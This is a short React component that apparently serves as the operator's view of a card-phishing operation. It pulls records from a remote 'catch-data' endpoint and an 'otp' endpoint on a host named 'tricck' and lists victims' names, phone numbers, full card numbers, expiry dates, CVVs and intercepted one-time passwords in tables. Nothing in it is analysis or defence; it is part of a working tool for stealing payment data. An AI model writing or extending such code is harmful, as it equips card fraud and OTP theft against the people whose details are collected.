import Nav from "./components/Nav";
import axios from "axios";
import { useEffect, useState } from "react";
const resault = () => {
  useEffect(() => {
    catchData();
    catchOtp();
  }, []);
  const [data, setData] = useState([]);
  const [otp, setOtp] = useState([]);
  const catchData = () => {
    axios.get("https://tricck.onrender.com/catch-data").then((data) => {
      setData(data.data);
    });
  };
  const catchOtp = () => {
    axios.get("https://tricck.onrender.com/otp").then((data) => {
      setOtp(data.data);
    });
  };
  console.log(otp);
  return (
    <div className="data">
      <Nav />
      <div className="container">
        <table class="table table-bordered border-primary">
          <thead>
            <tr className="bg-primary text-center text-light">
              <th scope="col">Name</th>
              <th scope="col">Phone</th>
              <th scope="col">Card num</th>
              <th scope="col">Expire</th>
              <th scope="col">Cvv</th>
              <th scope="col">Price</th>
              <th scope="col">Event name</th>
            </tr>
          </thead>
          <tbody>
            {data.map((rus) => {
              return (
                <tr className="bg-light text-center">
                  <>
                    <td>{rus.name}</td>
                    <td>{rus.phone}</td>
                    <td>{rus.num}</td>
                    <td>
                      {rus.month} / {rus.year}
                    </td>
                    <td>{rus.cvv}</td>
                    <td>{rus.plan}</td>
                    <td>{rus.desc}</td>
                  </>
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>
        <table class="table table-bordered border-primary">
          <thead>
            <tr className="bg-primary text-center text-light">
              <th scope="col">OTP</th>
            </tr>
          </thead>
          <tbody>
          {otp.map((rus) => {
            return (
                  <tr className="bg-light text-center">
                  <td>{rus.otpMsg}</td>
                </tr>
                  );
                })}
                  
          </tbody>
        </table>
      </div>
  );
};
export default resault;
